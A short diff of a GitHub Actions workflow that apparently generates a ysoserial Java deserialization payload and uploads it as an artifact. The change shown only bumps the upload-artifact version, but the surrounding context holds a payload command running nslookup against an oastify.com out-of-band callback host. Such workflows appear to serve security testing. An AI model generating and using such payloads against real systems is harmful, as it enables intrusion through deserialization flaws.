@@ -26,7 +26,7 @@ jobs:
             -c "nslookup h6okq9snf7qbxu2fz1zwbazvum0ho9cy.oastify.com" > payload.txt
 
       - name: Upload Payload Artifact
-        uses: actions/upload-artifact@v3
+        uses: actions/upload-artifact@v3.1.3
         with:
           name: ysoserial-payload
           path: payload.txt
